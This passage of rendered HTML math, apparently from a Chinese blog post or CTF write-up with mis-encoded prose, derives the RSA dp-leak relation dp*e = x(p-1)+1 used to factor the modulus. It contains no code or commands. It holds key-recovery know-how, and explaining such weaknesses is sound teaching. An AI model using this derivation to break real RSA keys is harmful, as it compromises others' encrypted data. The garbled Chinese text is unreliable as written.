encoding="application/x-tex">dp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span></span>æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œå› ä¸ºå…¶ä¸­è•´å«äº†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>çš„ä¿¡æ¯ï¼Œåªè¦ç¨åŠ æ¨å¯¼å°±èƒ½å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ã€‚</p><p>æ­¤æ—¶æ¨å¯¼å¦‚ä¸‹ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}  dp*e &amp;\equiv d*e \mod (p-1) \\ dp*e &amp;= d*e+k_1*(p-1) \\d*e &amp;= dp*e+k_1(p-1)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>ç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d*e \equiv 1 \mod \varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ï¼Œæ‰€ä»¥</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>âˆ’</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ’</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mtext>ä»¤</mtext><mo stretchy="false">(</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ’</mo><msub><mi>k</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>ä¸º</mtext><mi>x</mi><mtext>ï¼Œåˆ™è¯¥å¼å˜æˆ</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>x</mi><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} dp*e+k_1(p-1) &amp;\equiv 1\mod \varphi(n)\\dp*e+k_1(p-1) &amp;\equiv 1\mod (p-1)(q-1)\\dp*e+k_1(p-1) &amp;= k_2*(p-1)(q-1)+1\\dp*e &amp;= k_2(p-1)(q-1)+1-k_1(p-1)\\dp*e &amp;= (k_2(q-1)-k_1)(p-1)+1    \\ä»¤(k_2(q-1)-k_1)&amp;ä¸ºxï¼Œåˆ™è¯¥å¼å˜æˆ:    \\dp*e &amp;= x(p-1)+1\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:10.5em;vertical-align:-5em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.5em;"><span style="top:-7.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-6.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-0.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">ä»¤</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:1.34em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:5em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.5em;"><span style="top:-7.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-6.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-0.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord cjk_fallback">ä¸º</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">ï¼Œåˆ™è¯¥å¼å˜æˆ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span><span 